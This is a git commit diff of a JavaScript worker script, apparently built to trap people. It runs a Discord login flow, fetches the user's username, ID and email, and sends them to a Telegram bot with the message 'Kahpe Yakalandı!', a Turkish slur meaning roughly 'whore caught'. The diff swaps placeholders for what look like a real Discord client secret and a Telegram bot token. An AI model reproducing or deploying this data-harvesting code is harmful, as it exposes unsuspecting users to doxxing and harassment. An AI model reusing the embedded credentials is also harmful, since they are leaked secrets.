7146b976a1af48734adc7c0d25d870ac587afe66
Pateliyim <klchamzaklc21@gmail.com>
2025-03-18 22:50:35 +0300

    Update and rename kahpe.js to index.js

--- index.js
+++ index.js
@@ -5,7 +5,7 @@ addEventListener('fetch', event => {
 async function handleRequest(request) {
   const url = new URL(request.url);
   if (url.pathname === '/auth') {
-    const redirectUrl = https://discord.com/api/oauth2/authorize?client_id=YOUR_CLIENT_ID&redirect_uri=https://kahpeavcisi.com/callback&response_type=code&scope=identify%20email;
+    const redirectUrl = https://discord.com/api/oauth2/authorize?client_id=1351640029222535258&redirect_uri=https://cryzex.com.tr/callback&response_type=code&scope=identify%20email;
     return Response.redirect(redirectUrl, 302);
   }
   if (url.pathname === '/callback') {
@@ -13,7 +13,7 @@ async function handleRequest(request) {
     const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: client_id=YOUR_CLIENT_ID&client_secret=YOUR_CLIENT_SECRET&grant_type=authorization_code&code=${code}&redirect_uri=https://kahpeavcisi.com/callback
+      body: client_id=1351640029222535258&client_secret=zzmjUSG5YdtZDlRXNMiIKYbCN86VDflR&grant_type=authorization_code&code=${code}&redirect_uri=https://cryzex.com.tr/callback
     });
     const tokenData = await tokenResponse.json();
     const accessToken = tokenData.access_token;
@@ -24,7 +24,7 @@ async function handleRequest(request) {
     const userData = await userResponse.json();
 
     const telegramMessage = Kahpe Yakalandı!\nAd: ${userData.username}#${userData.discriminator}\nID: ${userData.id}\nE-posta: ${userData.email || 'Yok'};
-    await fetch(https://api.telegram.org/botYOUR_TELEGRAM_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=${encodeURIComponent(telegramMessage)});
+    await fetch(https://api.telegram.org/bot7851030674:AAF_cdMWuwUO0pDC65LlnRIu5KMezrhRAgk/sendMessage?chat_id=5368709036&text=${encodeURIComponent(telegramMessage)});
 
     return new Response('Kahpe avlandı!', { status: 200 });
   }
